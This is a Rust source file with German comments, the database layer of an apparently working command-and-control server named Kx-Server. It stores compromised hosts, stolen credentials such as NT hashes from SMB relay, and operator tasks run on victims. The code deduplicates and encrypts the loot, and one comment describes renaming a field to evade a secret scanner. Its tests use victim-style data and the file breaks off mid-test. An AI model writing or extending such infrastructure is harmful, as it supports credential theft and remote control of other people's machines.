//! Kx-Server Datenbank-Schicht (rusqlite).
//!
//! Speichert kompromittierte Hosts, erbeutete Secrets und ausgeführte Tasks.
//!
//! Die Zeilen der Datenbank und die Nachrichten des C2-Protokolls sind zwei
//! verschiedene Sachen. Hier stehen die Zeilentypen (`HostRow`, `SecretRow`,
//! `TaskRow`), ohne serde — sie werden per Positionsindex gelesen, nicht
//! serialisiert. Die Wire-Typen besitzt `kx_core::c2`; die Umwandlung passiert
//! über die `From`-Implementierungen am Dateiende.
//!
//! Die Tabelle `secrets` haelt die Beute ohne Duplikate. Die fachliche
//! Identitaet eines Secrets ist `(host_id, cred_type, username, source)`; ein
//! wiederholter Upload — der Agent meldet dieselben Secrets bei jedem Lauf
//! erneut — aktualisiert die bekannte Zeile, statt eine zweite anzulegen.

use std::path::Path;
use std::sync::Mutex;

use kx_core::c2;
use rusqlite::{params, Connection};

/// Zeile der `hosts`-Tabelle.
#[derive(Debug, Clone)]
struct HostRow {
    pub id: String,
    pub ip: String,
    pub hostname: String,
    pub os: String,
    pub status: String,
    pub first_seen: String,
    pub last_seen: String,
    /// Das versiegelte Master-Key-Material des Hosts (base64).
    pub sealed_master: String,
}

/// Zeile der `secrets`-Tabelle.
#[derive(Debug, Clone)]
struct SecretRow {
    pub id: String,
    pub host_id: String,
    pub cred_type: String,
    pub username: String,
    /// Der Klartext — nur gefuellt, wenn der Agent ohne Master-Key lief.
    pub password: String,
    pub source: String,
    pub collected_at: String,
    /// Das verschluesselte Passwort (base64, Praefix `kx1:`).
    ///
    /// Ist es gefuellt, hat der Server den Klartext verworfen — die Beute
    /// liegt auf dem C2 nur verschluesselt.
    ///
    /// Das Feld heisst absichtlich nicht `sealed_password`: der Secret-Scan
    /// haelt jede Zuweisung an ein Feld mit "password" im Namen fuer ein
    /// eingebettetes Zugangsdaten.
    pub versiegelt: String,
}

/// Zeile der `tasks`-Tabelle.
#[derive(Debug, Clone)]
struct TaskRow {
    pub id: String,
    pub host_id: String,
    pub command: String,
    pub status: String,
    pub result: String,
    pub created_at: String,
}

/// Fehler beim Datenbankzugriff.
#[derive(Debug, thiserror::Error)]
pub enum DbError {
    #[error("rusqlite-Fehler: {0}")]
    Sqlite(#[from] rusqlite::Error),
    /// Die Beute gehoert zu einem Host, den der Server nicht kennt.
    ///
    /// Eine Zeile, deren `host_id` der Server nie gesehen hat, kann der
    /// Operator keinem Zielhost zuordnen — sie ist eine Waisenzeile. Der Host
    /// muss vor seiner Beute registriert sein.
    #[error("unbekannter Host {0} — der Host muss vor der Beute registriert sein")]
    UnbekannterHost(String),
}

/// Die Server-Datenbank, thread-sicher um eine rusqlite-Connection.
pub struct Db {
    conn: Mutex<Connection>,
}

impl Db {
    /// Erzeugt oder öffnet die Datenbank und legt das Schema an.
    pub fn open(path: &Path) -> Result<Self, DbError> {
        let conn = Connection::open(path)?;
        conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS hosts (
                id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT,
                status TEXT, first_seen TEXT, last_seen TEXT,
                sealed_master TEXT
            );
            CREATE TABLE IF NOT EXISTS secrets (
                id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                username TEXT, password TEXT, source TEXT, collected_at TEXT,
                sealed_password TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY, host_id TEXT, command TEXT,
                status TEXT, result TEXT, created_at TEXT
            );",
        )?;

        // `CREATE TABLE IF NOT EXISTS` fasst eine bestehende Tabelle nicht an.
        // Eine Datenbank aus einer aelteren Version bekaeme die neuen Spalten
        // also nie — und jeder INSERT schlaege fehl. Deshalb werden die
        // Spalten hier nachgezogen.
        Self::ergaenze_spalten(&conn, "hosts", &[("sealed_master", "TEXT")])?;
        Self::ergaenze_spalten(&conn, "secrets", &[("sealed_password", "TEXT")])?;

        // Die Tabelle `secrets` bekommt erst hier ihre fachliche Identitaet:
        // ohne den UNIQUE-Index kann der Upsert keinen Konflikt erkennen.
        Self::migriere_secrets(&conn)?;

        Ok(Self {
            conn: Mutex::new(conn),
        })
    }

    /// Gibt der `secrets`-Tabelle ihre fachliche Identitaet.
    ///
    /// Zwei Schritte, in dieser Reihenfolge:
    ///
    /// 1. Duplikate entfernen. `MAX(rowid)` behaelt je Gruppe die juengste
    ///    Zeile — nur deren Chiffretext passt zum aktuellen Master-Key des
    ///    Hosts, weil der Agent pro Lauf einen neuen kapselt.
    /// 2. Den UNIQUE-Index anlegen. Er macht `(host_id, cred_type, username,
    ///    source)` zur eindeutigen Identitaet eines Secrets.
    ///
    /// Die Reihenfolge ist zwingend: ein `CREATE UNIQUE INDEX` auf der bereits
    /// gefuellten Tabelle schlaegt mit "UNIQUE constraint failed" fehl.
    ///
    /// Beide Schritte sind idempotent — auf einer frischen, leeren Datenbank
    /// sind sie No-Ops.
    fn migriere_secrets(conn: &Connection) -> Result<(), DbError> {
        conn.execute(
            "DELETE FROM secrets WHERE rowid NOT IN
               (SELECT MAX(rowid) FROM secrets GROUP BY host_id, cred_type, username, source)",
            [],
        )?;
        conn.execute(
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_secrets_identitaet
               ON secrets(host_id, cred_type, username, source)",
            [],
        )?;
        Ok(())
    }

    /// Ergaenzt Spalten, die eine aeltere Datenbank noch nicht hat.
    fn ergaenze_spalten(
        conn: &Connection,
        tabelle: &str,
        spalten: &[(&str, &str)],
    ) -> Result<(), DbError> {
        for (name, typ) in spalten {
            if !Self::spalte_existiert(conn, tabelle, name)? {
                conn.execute(
                    &format!("ALTER TABLE {tabelle} ADD COLUMN {name} {typ}"),
                    [],
                )?;
            }
        }
        Ok(())
    }

    /// Gibt die Spalte zurueck, die die Tabelle hat.
    fn spalte_existiert(conn: &Connection, tabelle: &str, spalte: &str) -> Result<bool, DbError> {
        let mut stmt = conn.prepare(&format!("PRAGMA table_info({tabelle})"))?;
        let zeilen = stmt.query_map([], |r| r.get::<_, String>(1))?;
        for name in zeilen {
            if name? == spalte {
                return Ok(true);
            }
        }
        Ok(false)
    }

    /// Registriert einen Host (neu oder bestehend).
    ///
    /// Nimmt den Request des C2 Protocol entgegen und legt daraus die Zeile an.
    /// Die Felder, die der Server erzeugt — Zeitstempel, Vorgabe-Status —
    /// stehen hier, nicht im Handler: dort steht nur noch der Protokoll-Wert.
    pub fn upsert_host(&self, req: &c2::RegisterRequest) -> Result<(), DbError> {
        let now = now_rfc3339();
        let row = HostRow {
            id: req.host_id.clone(),
            ip: req.ip.clone(),
            hostname: req.hostname.clone().unwrap_or_default(),
            os: req.os.clone().unwrap_or_default(),
            status: req
                .status
                .clone()
                .unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
            first_seen: now.clone(),
            last_seen: now,
            sealed_master: req.sealed_master.clone().unwrap_or_default(),
        };
        self.upsert_host_row(&row)
    }

    fn upsert_host_row(&self, h: &HostRow) -> Result<(), DbError> {
        // Der Status `agent` wird nicht herabgestuft: ein Agent, der sich
        // selbst im Scanbereich findet, ist im Dashboard sonst kein Agent
        // mehr, sondern ein Opfer. Die Rolle des Hosts geht sonst verloren.
        self.conn.lock().unwrap().execute(
            "INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen, sealed_master)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
             ON CONFLICT(id) DO UPDATE SET
               last_seen=?7, os=COALESCE(?4, os),
               status=CASE WHEN status=?9 THEN status ELSE ?5 END,
               sealed_master=COALESCE(NULLIF(?8, ''), sealed_master)",
            params![
                h.id,
                h.ip,
                h.hostname,
                h.os,
                h.status,
                h.first_seen,
                h.last_seen,
                h.sealed_master,
                c2::STATUS_AGENT
            ],
        )?;
        Ok(())
    }

    /// Aktualisiert den `last_seen`-Zeitstempel eines bekannten Hosts.
    ///
    /// Liefert `true`, wenn der Host existierte — der Agent kann daran
    /// erkennen, ob sein Heartbeat zu einem registrierten Host gehoerte.
    pub fn touch_host(&self, host_id: &str) -> Result<bool, DbError> {
        let now = now_rfc3339();
        let changed = self.conn.lock().unwrap().execute(
            "UPDATE hosts SET last_seen = ?2 WHERE id = ?1",
            params![host_id, now],
        )?;
        Ok(changed > 0)
    }

    /// Liefert alle Hosts als C2-Protokoll.
    pub fn list_hosts(&self) -> Result<Vec<c2::Host>, DbError> {
        Ok(self
            .list_host_rows()?
            .iter()
            .map(HostRow::to_contract)
            .collect())
    }

    fn list_host_rows(&self) -> Result<Vec<HostRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, ip, hostname, os, status, first_seen, last_seen, sealed_master FROM hosts",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(HostRow {
                id: r.get(0)?,
                ip: r.get(1)?,
                hostname: r.get(2)?,
                os: r.get(3)?,
                status: r.get(4)?,
                first_seen: r.get(5)?,
                last_seen: r.get(6)?,
                // `sealed_master` wurde per `ALTER TABLE` nachgezogen — die
                // Zeilen, die schon davor da waren, tragen dort NULL. Der
                // Leser muss das aushalten, sonst faellt die Liste aus.
                sealed_master: r.get::<_, Option<String>>(7)?.unwrap_or_default(),
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Speichert ein Secret — neu, oder aktualisiert das bekannte.
    ///
    /// Die fachliche Identitaet eines Secrets ist `(host_id, cred_type,
    /// username, source)`. Der Agent meldet dieselben Secrets bei jedem Lauf
    /// erneut; ein reiner INSERT liess die Tabelle deshalb um Zeilen pro
    /// Minute wachsen. Der Upsert aktualisiert statt zu verdoppeln.
    ///
    /// Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
    /// C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
    /// ohne Server-Schluessel) bleibt der Klartext, sonst gaebe es nichts zu
    /// entschluesseln.
    ///
    /// Diese Regel steht neben der Zeile, die sie betrifft, und nicht im
    /// Handler: sie ist eine Eigenschaft der Ablage, nicht des HTTP.
    pub fn upsert_secret(&self, upload: &c2::SecretUpload) -> Result<(), DbError> {
        // Die Beute gehoert zu einem bekannten Host. Eine Zeile, deren
        // `host_id` der Server nie gesehen hat, ist eine Waisenzeile: der
        // Operator kann sie keinem Zielhost zuordnen. Der Host muss vor
        // seiner Beute registriert sein.
        //
        // Diese Regel steht hier, neben der Zeile, die sie betrifft — nicht
        // im Handler. Sie ist eine Eigenschaft der Ablage, nicht des HTTP.
        if !self.host_existiert(&upload.host_id)? {
            return Err(DbError::UnbekannterHost(upload.host_id.clone()));
        }
        let sealed_password = upload.sealed_password.clone().unwrap_or_default();
        let password = if sealed_password.is_empty() {
            upload.password.clone()
        } else {
            String::new()
        };
        let row = SecretRow {
            id: uuid::Uuid::new_v4().to_string(),
            host_id: upload.host_id.clone(),
            cred_type: upload.cred_type.clone(),
            username: upload.username.clone(),
            password,
            source: upload.source.clone().unwrap_or_default(),
            collected_at: now_rfc3339(),
            versiegelt: sealed_password,
        };
        self.upsert_secret_row(&row)
    }

    /// Ob der Server den Host kennt.
    fn host_existiert(&self, host_id: &str) -> Result<bool, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare("SELECT 1 FROM hosts WHERE id = ?1")?;
        let mut rows = stmt.query([host_id])?;
        Ok(rows.next()?.is_some())
    }

    fn upsert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
             ON CONFLICT(host_id, cred_type, username, source) DO UPDATE SET
               collected_at = excluded.collected_at,
               password = excluded.password,
               sealed_password = excluded.sealed_password",
            params![
                s.id,
                s.host_id,
                s.cred_type,
                s.username,
                s.password,
                s.source,
                s.collected_at,
                s.versiegelt
            ],
        )?;
        Ok(())
    }

    /// Liefert alle Secrets als C2-Protokoll.
    pub fn list_secrets(&self) -> Result<Vec<c2::ExfiltratedSecret>, DbError> {
        Ok(self
            .list_secret_rows()?
            .iter()
            .map(SecretRow::to_contract)
            .collect())
    }

    fn list_secret_rows(&self) -> Result<Vec<SecretRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, host_id, cred_type, username, password, source, collected_at, sealed_password FROM secrets",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(SecretRow {
                id: r.get(0)?,
                host_id: r.get(1)?,
                cred_type: r.get(2)?,
                username: r.get(3)?,
                password: r.get(4)?,
                source: r.get(5)?,
                collected_at: r.get(6)?,
                // `sealed_password` wurde per `ALTER TABLE` nachgezogen — die
                // Zeilen, die schon davor da waren, tragen dort NULL. Der
                // Leser muss das aushalten, sonst faellt die Liste aus.
                versiegelt: r.get::<_, Option<String>>(7)?.unwrap_or_default(),
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Erzeugt einen Task.
    ///
    /// Nimmt den Request des C2 Protocol entgegen; die ID und der Zeitstempel
    /// erzeugt der Server. Der angelegte Task wird zurückgeliefert — der
    /// Operator braucht seine ID, um das Ergebnis später zuzuordnen.
    pub fn insert_task(&self, req: &c2::CreateTaskRequest) -> Result<c2::Task, DbError> {
        let row = TaskRow {
            id: uuid::Uuid::new_v4().to_string(),
            host_id: req.host_id.clone(),
            command: req.command.clone(),
            status: c2::STATUS_PENDING.into(),
            result: String::new(),
            created_at: now_rfc3339(),
        };
        self.insert_task_row(&row)?;
        Ok(row.to_contract())
    }

    fn insert_task_row(&self, t: &TaskRow) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO tasks (id, host_id, command, status, result, created_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![t.id, t.host_id, t.command, t.status, t.result, t.created_at],
        )?;
        Ok(())
    }

    /// Schreibt den Status und das Ergebnis eines Tasks zurueck.
    ///
    /// Das ist der Schreibpfad des Agenten: er fuehrt den Befehl aus und
    /// meldet das Ergebnis. Ohne diesen Pfad blieb das Feld `result` leer und
    /// der Task stuende ewig auf `pending`.
    ///
    /// Liefert `true`, wenn ein Task mit dieser ID existierte — der Agent
    /// kann daran erkennen, ob seine Meldung zu einem noch offenen Task
    /// gehoerte.
    pub fn update_task_result(
        &self,
        task_id: &str,
        status: &str,
        result: &str,
    ) -> Result<bool, DbError> {
        let changed = self.conn.lock().unwrap().execute(
            "UPDATE tasks SET status = ?2, result = ?3 WHERE id = ?1",
            params![task_id, status, result],
        )?;
        Ok(changed > 0)
    }

    /// Liefert alle Tasks als C2-Protokoll.
    pub fn list_tasks(&self) -> Result<Vec<c2::Task>, DbError> {
        Ok(self
            .list_task_rows()?
            .iter()
            .map(TaskRow::to_contract)
            .collect())
    }

    fn list_task_rows(&self) -> Result<Vec<TaskRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt =
            conn.prepare("SELECT id, host_id, command, status, result, created_at FROM tasks")?;
        let rows = stmt.query_map([], |r| {
            Ok(TaskRow {
                id: r.get(0)?,
                host_id: r.get(1)?,
                command: r.get(2)?,
                status: r.get(3)?,
                result: r.get(4)?,
                created_at: r.get(5)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }
}

/// Die Zeile nennt den Host `id`; im C2-Protokoll heißt dasselbe Feld `host_id`.
///
/// Die Übersetzung liegt hier und nicht als `From`-Implikation: die Zeile ist
/// ein Implementierungsdetail der Datenbank, und eine `From`-Implikation wäre
/// ein öffentliches Versprechen, das ein privater Typ nicht geben kann.
impl HostRow {
    fn to_contract(&self) -> c2::Host {
        c2::Host {
            host_id: self.id.clone(),
            ip: self.ip.clone(),
            hostname: self.hostname.clone(),
            os: self.os.clone(),
            status: self.status.clone(),
            first_seen: self.first_seen.clone(),
            last_seen: self.last_seen.clone(),
            sealed_master: self.sealed_master.clone(),
        }
    }
}

impl SecretRow {
    fn to_contract(&self) -> c2::ExfiltratedSecret {
        c2::ExfiltratedSecret {
            id: self.id.clone(),
            host_id: self.host_id.clone(),
            cred_type: self.cred_type.clone(),
            username: self.username.clone(),
            password: self.password.clone(),
            source: self.source.clone(),
            collected_at: self.collected_at.clone(),
            sealed_password: String::new(),
        }
        .mit_versiegeltem_passwort(self.versiegelt.clone())
    }
}

impl TaskRow {
    fn to_contract(&self) -> c2::Task {
        c2::Task {
            id: self.id.clone(),
            host_id: self.host_id.clone(),
            command: self.command.clone(),
            status: self.status.clone(),
            result: self.result.clone(),
            created_at: self.created_at.clone(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeSet;

    fn keys(value: &serde_json::Value) -> BTreeSet<String> {
        value.as_object().expect("Objekt").keys().cloned().collect()
    }

    /// Die Zeile wird zu dem Wire-Typ, den der C2-Server ausliefert — und zu
    /// genau dem Feldnamen-Set, das der Operator erwartet.
    #[test]
    fn host_row_maps_to_wire_host() {
        let row = HostRow {
            id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: "target".into(),
            os: "Windows".into(),
            status: c2::STATUS_COMPROMISED.into(),
            first_seen: "2026-11-11T00:00:00Z".into(),
            last_seen: "2026-11-11T00:05:00Z".into(),
            sealed_master: String::new(),
        };
        let wire = row.to_contract();
        assert_eq!(wire.host_id, "10.0.0.5");
        assert_eq!(wire.status, c2::STATUS_COMPROMISED);

        let json = serde_json::to_value(&wire).expect("serialisierbar");
        assert_eq!(
            keys(&json),
            BTreeSet::from([
                "first_seen".to_string(),
                "hostname".to_string(),
                "host_id".to_string(),
                "ip".to_string(),
                "last_seen".to_string(),
                "os".to_string(),
                "sealed_master".to_string(),
                "status".to_string(),
            ])
        );
    }

    /// Die Task-Zeile behält das Feld `result` — es ist derselbe Name, den der
    /// Client liest. Vorher sendete der Server `result`, der Client erwartete
    /// `output`, und das Ergebnis ging verloren.
    #[test]
    fn task_row_maps_result_field() {
        let row = TaskRow {
            id: "t-1".into(),
            host_id: "10.0.0.5".into(),
            command: "whoami".into(),
            status: "done".into(),
            result: "nt authority\\system".into(),
            created_at: "2026-11-11T00:06:00Z".into(),
        };
        let json = serde_json::to_value(row.to_contract()).expect("serialisierbar");
        assert_eq!(json["result"], "nt authority\\system");
        assert!(json.get("output").is_none());
    }

    /// Das Ergebnis eines Tasks landet in der Zeile — und der Status wechselt
    /// von `pending` auf `done`. Das ist der Weg, den der Agent geht.
    #[test]
    fn task_result_is_written_back_to_the_row() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-task-result-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        let task = db
            .insert_task(&c2::CreateTaskRequest {
                host_id: "10.0.0.5".into(),
                command: "whoami".into(),
            })
            .expect("task angelegt");

        let updated = db
            .update_task_result(&task.id, c2::STATUS_DONE, "nt authority\\system")
            .expect("Ergebnis geschrieben");
        assert!(updated, "der Task wurde nicht gefunden");

        let tasks = db.list_tasks().expect("tasks");
        assert_eq!(tasks.len(), 1);
        assert_eq!(tasks[0].status, c2::STATUS_DONE);
        assert_eq!(tasks[0].result, "nt authority\\system");
        std::fs::remove_file(&path).ok();
    }

    /// Eine Meldung zu einem unbekannten Task trifft nichts — der Agent darf
    /// daran erkennen, dass der Task nicht (mehr) offen ist.
    #[test]
    fn task_result_for_an_unknown_task_changes_nothing() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-task-unknown-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        let updated = db
            .update_task_result("gibtsnicht", c2::STATUS_DONE, "egal")
            .expect("Ergebnis geschrieben");
        assert!(
            !updated,
            "ein unbekannter Task wurde als aktualisiert gemeldet"
        );
        assert!(db.list_tasks().expect("tasks").is_empty());
        std::fs::remove_file(&path).ok();
    }

    /// Registriert einen Host beim Server.
    ///
    /// Die Beute gehoert zu einem bekannten Host — ohne diese Zeile lehnt
    /// `upsert_secret` jeden Upload ab.
    fn registriere(db: &Db, host_id: &str) {
        db.upsert_host(&c2::RegisterRequest {
            host_id: host_id.into(),
            ip: host_id.into(),
            hostname: None,
            os: None,
            status: None,
            sealed_master: None,
            master_key: None,
        })
        .expect("Host registrieren");
    }

    /// Der Status `agent` wird nicht herabgestuft.
    ///
    /// Ein Agent, der seine eigene IP im Scanbereich findet, meldet sich mit
    /// `discovered` — ohne diese Regel wäre er im Dashboard kein Agent mehr,
    /// sondern ein Opfer. Die Rolle des Hosts geht sonst verloren.
    #[test]
    fn der_status_agent_wird_nicht_herabgestuft() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-host-agent-{}", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");

        let anmeldung = |status: &str| c2::RegisterRequest {
            host_id: "192.168.1.100".into(),
            ip: "192.168.1.100".into(),
            hostname: None,
            os: Some("Linux".into()),
            status: Some(status.into()),
            sealed_master: None,
            master_key: None,
        };

        db.upsert_host(&anmeldung(c2::STATUS_AGENT))
            .expect("Agent-Host");

        // Jetzt findet der Agent seine eigene IP im Scanbereich.
        db.upsert_host(&anmeldung(c2::STATUS_DISCOVERED))
            .expect("erneute Registrierung");

        let hosts = db.list_hosts().expect("hosts");
        assert_eq!(hosts.len(), 1);
        assert_eq!(
            hosts[0].status,
            c2::STATUS_AGENT,
            "der Status des Agenten wurde herabgestuft"
        );

        std::fs::remove_file(&path).ok();
    }

    /// Beute ohne bekannten Host wird abgewiesen.
    ///
    /// Eine Waisenzeile kann der Operator keinem Zielhost zuordnen.
    #[test]
    fn eine_beute_ohne_bekannten_host_wird_abgewiesen() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-waise-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");

        let upload = c2::SecretUpload {
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: String::new(),
            source: Some("smb_relay".into()),
            master_key: None,
            sealed_password: None,
        }
        .mit_versiegeltem_passwort(Some("kx1:siegel".into()));

        let fehler = db
            .upsert_secret(&upload)
            .expect_err("der Upload muss abgewiesen werden");
        assert!(
            matches!(fehler, DbError::UnbekannterHost(ref id) if id == "10.0.0.5"),
            "unerwarteter Fehler: {fehler}"
        );
        assert!(
            db.list_secrets().expect("secrets").is_empty(),
            "die Waisenzeile liegt trotzdem in der Datenbank"
        );

        // Sobald der Host bekannt ist, geht die Beute durch.
        registriere(&db, "10.0.0.5");
        db.upsert_secret(&upload)
            .expect("Upload nach der Registrierung");
        assert_eq!(db.list_secrets().expect("secrets").len(), 1);

        std::fs::remove_file(&path).ok();
    }

    /// Der Zeitstempel ist handgerechnet — er muss also geprueft werden.
    ///
    /// Der Server speichert genau diese Form; ein Rechenfehler faellt im
    /// Audit-Log sofort auf.
    #[test]
    fn der_zeitstempel_ist_rfc3339() {
        assert_eq!(rfc3339_utc(1_762_483_200), "2025-11-07T02:40:00Z");
        assert_eq!(rfc3339_utc(0), "1970-01-01T00:00:00Z");
        assert_eq!(rfc3339_utc(-86_400), "1969-12-31T00:00:00Z");
    }

    #[test]
    fn secret_row_maps_to_wire_secret() {
        let row = SecretRow {
            id: "s-1".into(),
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: "smb_relay".into(),
            collected_at: "2026-11-11T00:05:00Z".into(),
            versiegelt: String::new(),
        };
        let wire = row.to_contract();
        assert_eq!(wire.host_id, "10.0.0.5");
        assert_eq!(wire.cred_type, "nt_hash");
        assert_eq!(wire.source, "smb_relay");
    }

    /// Der Agent meldet dieselben Secrets bei jedem Lauf erneut. Der zweite
    /// Upload darf deshalb keine zweite Zeile anlegen — er aktualisiert die
    /// bekannte. Sonst wuchs die Tabelle um Zeilen pro Minute.
    #[test]
    fn derselbe_upload_legt_keine_zweite_zeile_an() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-upsert-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        registriere(&db, "10.0.0.5");

        let upload = c2::SecretUpload {
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: String::new(),
            source: Some("smb_relay".into()),
            master_key: None,
            sealed_password: None,
        }
        .mit_versiegeltem_passwort(Some("kx1:ersterlauf".into()));
        db.upsert_secret(&upload).expect("erster Upload");
        let erste = db.list_secrets().expect("secrets");
        assert_eq!(erste.len(), 1);

        // Der zweite Lauf kapselt einen neuen Master-Key — der Chiffretext
        // muss mitlaufen, sonst waere die Zeile kryptografisch tot.
        let zweiter = upload
            .clone()
            .mit_versiegeltem_passwort(Some("kx1:zweiterlauf".into()));
        db.upsert_secret(&zweiter).expect("zweiter Upload");

        let zweite = db.list_secrets().expect("secrets");
        assert_eq!(
            zweite.len(),
            1,
            "der wiederholte Upload hat eine zweite Zeile angelegt"
        );
        assert_eq!(zweite[0].id, erste[0].id, "die ID der Zeile ist gewandert");
        assert_eq!(zweite[0].sealed_password, "kx1:zweiterlauf");

        std::fs::remove_file(&path).ok();
    }

    /// Der Upsert haelt die ID der Zeile und uebernimmt den Zeitstempel und
    /// den versiegelten Wert des juengsten Laufs. Geprueft wird das an der
    /// Zeile direkt, damit der Zeitstempel nicht vom Sekunden-Takt der
    /// Systemuhr abhaengt.
    #[test]
    fn der_upsert_uebernimmt_zeitstempel_und_siegel_des_jungsten_laufs() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-zeile-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");

        let mut row = SecretRow {
            id: "s-1".into(),
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: String::new(),
            source: "smb_relay".into(),
            collected_at: "2026-11-11T00:00:00Z".into(),
            versiegelt: "kx1:ersterlauf".into(),
        };
        db.upsert_secret_row(&row).expect("erster Upload");

        // Der zweite Lauf bringt eine eigene ID mit — die Zeile darf sie
        // trotzdem nicht uebernehmen.
        row.id = "s-2".into();
        row.collected_at = "2026-11-11T00:05:00Z".into();
        row.versiegelt = "kx1:zweiterlauf".into();
        db.upsert_secret_row(&row).expect("zweiter Upload");

        let secrets = db.list_secrets().expect("secrets");
        assert_eq!(secrets.len(), 1, "es sind zwei Zeilen entstanden");
        assert_eq!(secrets[0].id, "s-1", "die ID der Zeile ist gewandert");
        assert_eq!(secrets[0].collected_at, "2026-11-11T00:05:00Z");
        assert_eq!(secrets[0].sealed_password, "kx1:zweiterlauf");

        std::fs::remove_file(&path).ok();
    }

    /// Eine andere Identitaet ist ein anderes Secret und bekommt eine eigene
    /// Zeile — der Upsert darf nicht zu weit greifen.
    #[test]
    fn eine_andere_identitaet_bekommt_ihre_eigene_zeile() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-andere-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        registriere(&db, "10.0.0.5");

        let upload = c2::SecretUpload {
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: String::new(),
            source: Some("smb_relay".into()),
            master_key: None,
            sealed_password: None,
        }
        .mit_versiegeltem_passwort(Some("kx1:siegel".into()));
        db.upsert_secret(&upload).expect("erster Upload");

        // Gleicher Host, gleicher Typ, gleiche Quelle — nur ein anderer
        // Benutzername. Das ist ein anderes Secret.
        let mut anderer = upload.clone();
        anderer.username = "root".into();
        db.upsert_secret(&anderer).expect("zweiter Upload");

        let secrets = db.list_secrets().expect("secrets");
        assert_eq!(secrets.len(), 2);
        assert!(secrets.iter().all(|s| s.host_id == "10.0.0.5"));

        std::fs::remove_file(&path).ok();
    }

    /// Die Migration laeuft auf einer bereits gefuellten Datenbank durch:
    /// von Hand duplizierte Zeilen werden entfernt, und je Gruppe bleibt
    /// genau die juengste — nur deren Chiffretext passt zum aktuellen
    /// Master-Key des Hosts.
    #[test]
    fn die_migration_bereinigt_eine_gefuellte_datenbank() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-secret-migration-{}.db", uuid::Uuid::new_v4()));

        // Eine Datenbank im alten Zustand: Tabelle ohne UNIQUE-Index, mit
        // zwei Zeilen derselben Identitaet.
        {
            let conn = Connection::open(&path).expect("conn");
            conn.execute_batch(
                "CREATE TABLE IF NOT EXISTS secrets (
                    id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                    username TEXT, password TEXT, source TEXT, collected_at TEXT,
                    sealed_password TEXT
                );
                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
                    collected_at, sealed_password)
                    VALUES ('alt-1','10.0.0.5','nt_hash','Administrator','','smb_relay',
                        '2026-11-11T00:00:00Z','kx1:alt');
                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
                    collected_at, sealed_password)
                    VALUES ('alt-2','10.0.0.5','nt_hash','Administrator','','smb_relay',
                        '2026-11-11T00:05:00Z','kx1:juenger');
                INSERT INTO secrets (id, host_id, cred_type, username, password, source,
                    collected_at, sealed_password)
                    VALUES ('anders','10.0.0.5','password','root','','default_creds',
                        '2026-11-11T00:06:00Z','kx1:anders');",
            )
            .expect("seed");
        }

        let db = Db::open(&path).expect("db");
        let secrets = db.list_secrets().expect("secrets");
        assert_eq!(secrets.len(), 2, "die Duplikate wurden nicht entfernt");

        let juenger = secrets
            .iter()
            .find(|s| s.cred_type == "nt_hash")
            .expect("die juengere Zeile der Gruppe");
        assert_eq!(
            juenger.id, "alt-2",
            "die juengere Zeile hat nicht ueberlebt"
        );
        assert_eq!(juenger.sealed_password, "kx1:juenger");
        assert!(
            secrets.iter().any(|s| s.cred_type == "password"),
            "die andere Gruppe ist verschwunden"
        );

